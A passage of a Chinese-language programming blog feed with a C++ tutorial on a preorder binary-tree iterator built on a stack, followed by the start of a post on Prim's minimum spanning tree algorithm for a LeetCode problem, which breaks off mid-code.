    <id>https://1xueyu1.github.io/2023/11/27/%E4%BA%8C%E5%8F%89%E6%A0%91%E8%BF%AD%E4%BB%A3%E5%99%A8/</id>
    <published>2023-11-27T14:36:10.000Z</published>
    <updated>2023-11-28T05:10:39.528Z</updated>
    
    <content type="html"><![CDATA[<h2 id="二叉树迭代器（前序遍历）"><a href="#二叉树迭代器（前序遍历）" class="headerlink" title="二叉树迭代器（前序遍历）"></a>二叉树迭代器（前序遍历）</h2><h3 id="定义树节点"><a href="#定义树节点" class="headerlink" title="定义树节点"></a>定义树节点</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 树节点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>* left, * right;</span><br><span class="line">&#125;TreeNode;</span><br></pre></td></tr></table></figure><h3 id="创建二叉树类"><a href="#创建二叉树类" class="headerlink" title="创建二叉树类"></a>创建二叉树类</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 二叉树类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">BinaryTree</span>() &#123;&#125;</span><br><span class="line"><span class="comment">// 二叉树构造函数</span></span><br><span class="line"><span class="built_in">BinaryTree</span>(<span class="type">int</span> num[], <span class="type">int</span> numSize, <span class="type">int</span>* index)</span><br><span class="line">&#123;</span><br><span class="line">root = <span class="built_in">creatBinaryTree</span>(num, numSize, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建二叉树函数</span></span><br><span class="line"><span class="function">TreeNode* <span class="title">creatBinaryTree</span><span class="params">(<span class="type">int</span> num[], <span class="type">int</span> numSize, <span class="type">int</span>* index)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回begin迭代器</span></span><br><span class="line"><span class="function">BinaryTreeIterator <span class="title">begin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">BinaryTreeIterator</span>(root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回end迭代器</span></span><br><span class="line"><span class="function">BinaryTreeIterator <span class="title">end</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">BinaryTreeIterator</span>(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">addFive</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(BinaryTreeIterator it = <span class="built_in">begin</span>(); it != <span class="built_in">end</span>(); ++it)</span><br><span class="line">&#123;</span><br><span class="line">(*it)-&gt;val += <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">TreeNode* root;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">TreeNode* <span class="title">BinaryTree::creatBinaryTree</span><span class="params">(<span class="type">int</span> num[], <span class="type">int</span> numSize, <span class="type">int</span>* index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//如果数组当前值为-1，空节点</span></span><br><span class="line"><span class="keyword">if</span> (num[(*index)] == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">(*index)++;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">TreeNode* root = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> ((*index) &lt; numSize)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//否则新建节点</span></span><br><span class="line">root = (TreeNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(TreeNode));</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;内存分配失败!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">root-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">root-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">root-&gt;val = num[(*index)++];</span><br><span class="line"></span><br><span class="line">root-&gt;left = <span class="built_in">creatBinaryTree</span>(num, numSize, index);</span><br><span class="line">root-&gt;right = <span class="built_in">creatBinaryTree</span>(num, numSize, index);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树迭代器"><a href="#二叉树迭代器" class="headerlink" title="二叉树迭代器"></a>二叉树迭代器</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构建二叉树的迭代器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTreeIterator</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">// 先存放二叉树的根节点</span></span><br><span class="line"><span class="built_in">BinaryTreeIterator</span>(TreeNode* root)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (root)</span><br><span class="line">&#123;</span><br><span class="line">st.<span class="built_in">push</span>(root);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载*，返回当前位置的节点</span></span><br><span class="line">TreeNode*&amp; <span class="keyword">operator</span>*()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> st.<span class="built_in">top</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载++， 按照前序遍历的方式遍历二叉树</span></span><br><span class="line">BinaryTreeIterator&amp; <span class="keyword">operator</span>++()</span><br><span class="line">&#123;</span><br><span class="line">TreeNode* node = st.<span class="built_in">top</span>();</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">if</span> (node-&gt;right)st.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line"><span class="keyword">if</span> (node-&gt;left)st.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>!=(<span class="type">const</span> BinaryTreeIterator&amp; a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> !st.<span class="built_in">empty</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">stack&lt;TreeNode*&gt; st;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;numeric&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 树节点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>* left, * right;</span><br><span class="line">&#125;TreeNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建二叉树的迭代器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTreeIterator</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">// 先存放二叉树的根节点</span></span><br><span class="line"><span class="built_in">BinaryTreeIterator</span>(TreeNode* root)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (root)</span><br><span class="line">&#123;</span><br><span class="line">st.<span class="built_in">push</span>(root);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载*，返回当前位置的节点</span></span><br><span class="line">TreeNode*&amp; <span class="keyword">operator</span>*()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> st.<span class="built_in">top</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按照前序遍历的方式遍历二叉树</span></span><br><span class="line">BinaryTreeIterator&amp; <span class="keyword">operator</span>++()</span><br><span class="line">&#123;</span><br><span class="line">TreeNode* node = st.<span class="built_in">top</span>();</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">if</span> (node-&gt;right)st.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line"><span class="keyword">if</span> (node-&gt;left)st.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>!=(<span class="type">const</span> BinaryTreeIterator&amp; a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> !st.<span class="built_in">empty</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">stack&lt;TreeNode*&gt; st;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 二叉树类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">BinaryTree</span>() &#123;&#125;</span><br><span class="line"><span class="comment">// 二叉树构造函数</span></span><br><span class="line"><span class="built_in">BinaryTree</span>(<span class="type">int</span> num[], <span class="type">int</span> numSize, <span class="type">int</span>* index)</span><br><span class="line">&#123;</span><br><span class="line">root = <span class="built_in">creatBinaryTree</span>(num, numSize, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建二叉树函数</span></span><br><span class="line"><span class="function">TreeNode* <span class="title">creatBinaryTree</span><span class="params">(<span class="type">int</span> num[], <span class="type">int</span> numSize, <span class="type">int</span>* index)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BinaryTreeIterator <span class="title">begin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">BinaryTreeIterator</span>(root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BinaryTreeIterator <span class="title">end</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">BinaryTreeIterator</span>(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">addFive</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(BinaryTreeIterator it = <span class="built_in">begin</span>(); it != <span class="built_in">end</span>(); ++it)</span><br><span class="line">&#123;</span><br><span class="line">(*it)-&gt;val += <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">TreeNode* root;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//前序遍历和此顺序一样，-1代表节点为空</span></span><br><span class="line"><span class="type">int</span> num[] = &#123; <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">8</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">15</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">43</span>, <span class="number">12</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">42</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">33</span>, <span class="number">21</span>, <span class="number">54</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">31</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">4</span>, <span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> numSize = <span class="built_in">sizeof</span>(num) / <span class="built_in">sizeof</span>(<span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 以root为根节点创建二叉树对象</span></span><br><span class="line"><span class="function">BinaryTree <span class="title">tree</span><span class="params">(num, numSize, &amp;index)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 利用 二叉树迭代器 遍历二叉树</span></span><br><span class="line"><span class="keyword">for</span> (BinaryTreeIterator it = tree.<span class="built_in">begin</span>(); it != tree.<span class="built_in">end</span>(); ++it)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; (*it)-&gt;val &lt;&lt; <span class="string">&quot;   &quot;</span>;</span><br><span class="line">sum += (*it)-&gt;val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; endl &lt;&lt; <span class="string">&quot;sum : &quot;</span> &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line"><span class="comment">// 用accumulate函数验证</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;accumulate值 : &quot;</span> &lt;&lt; <span class="built_in">accumulate</span>(tree.<span class="built_in">begin</span>(), tree.<span class="built_in">end</span>(), <span class="number">0</span>, [](<span class="type">int</span> sum, BinaryTreeIterator a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> sum + (*a)-&gt;val;</span><br><span class="line">&#125;) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 二叉树所有节点+5</span></span><br><span class="line">tree.<span class="built_in">addFive</span>();</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;所有节点+5后 :&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">for</span> (BinaryTreeIterator it = tree.<span class="built_in">begin</span>(); it != tree.<span class="built_in">end</span>(); ++it)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; (*it)-&gt;val &lt;&lt; <span class="string">&quot;   &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">TreeNode* <span class="title">BinaryTree::creatBinaryTree</span><span class="params">(<span class="type">int</span> num[], <span class="type">int</span> numSize, <span class="type">int</span>* index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//如果数组当前值为-1，空节点</span></span><br><span class="line"><span class="keyword">if</span> (num[(*index)] == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">(*index)++;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">TreeNode* root = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> ((*index) &lt; numSize)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//否则新建节点</span></span><br><span class="line">root = (TreeNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(TreeNode));</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;内存分配失败!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">root-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">root-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">root-&gt;val = num[(*index)++];</span><br><span class="line"></span><br><span class="line">root-&gt;left = <span class="built_in">creatBinaryTree</span>(num, numSize, index);</span><br><span class="line">root-&gt;right = <span class="built_in">creatBinaryTree</span>(num, numSize, index);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;二叉树迭代器（前序遍历）&quot;&gt;&lt;a href=&quot;#二叉树迭代器（前序遍历）&quot; class=&quot;headerlink&quot; title=&quot;二叉树迭代器（前序遍历）&quot;&gt;&lt;/a&gt;二叉树迭代器（前序遍历）&lt;/h2&gt;&lt;h3 id=&quot;定义树节点&quot;&gt;&lt;a href=&quot;#定义树节点&quot; c</summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="树" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/"/>
    
    
    <category term="二叉树" scheme="https://1xueyu1.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    
  </entry>
  
  <entry>
    <title>最小生成树</title>
    <link href="https://1xueyu1.github.io/2023/11/27/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/"/>
    <id>https://1xueyu1.github.io/2023/11/27/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/</id>
    <published>2023-11-27T02:22:26.000Z</published>
    <updated>2023-12-10T03:13:26.527Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode"><a href="#leetcode" class="headerlink" title="leetcode"></a>leetcode</h1><p><strong>模板题</strong><br><a href="https://leetcode.cn/problems/min-cost-to-connect-all-points/description/">1584. 连接所有点的最小费用 - 力扣（LeetCode）</a></p><h2 id="prim算法"><a href="#prim算法" class="headerlink" title="prim算法"></a>prim算法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">prim</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; points, <span class="type">int</span> start)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n = points.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.邻接矩阵记录所有边的距离</span></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">g</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> dist = <span class="built_in">abs</span>(points[i][<span class="number">0</span>] - points[j][<span class="number">0</span>]) + <span class="built_in">abs</span>(points[i][<span class="number">1</span>] - points[j][<span class="number">1</span>]);</span><br><span class="line">            g[i][j] = g[j][i] = dist;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 规定v[i] == 0的点为V集合，v[i] == 1的集合为Vnew集合</span></span><br><span class="line">    <span class="comment">// 记录点的状态 v[start] == 1代表用过了</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="comment">// 记录V集合到Vnew集合所有点中的最小距离</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">lowcost</span><span class="params">(n, INT_MAX)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把第一个点放入Vnew集合中</span></span><br><span class="line">    v[start] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i == start)<span class="keyword">continue</span>;</span><br><span class="line">        lowcost[i] = g[i][start];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理剩下的所有点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> _ = <span class="number">1</span>; _ &lt; n; _++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> minIndex = <span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> minVal = INT_MAX;</span><br><span class="line">        <span class="comment">// 查找与Vnew集合的最小距离</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(v[i] == <span class="number">0</span> &amp;&amp; lowcost[i] &lt; minVal)</span><br><span class="line">            &#123;</span><br><span class="line">                minIndex = i;</span><br><span class="line">                minVal = lowcost[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 把找到的点从V放入Vnew</span></span><br><span class="line">        v[minIndex] = <span class="number">1</span>;</span><br><span class="line">        ans += minVal;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新lowcost</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span 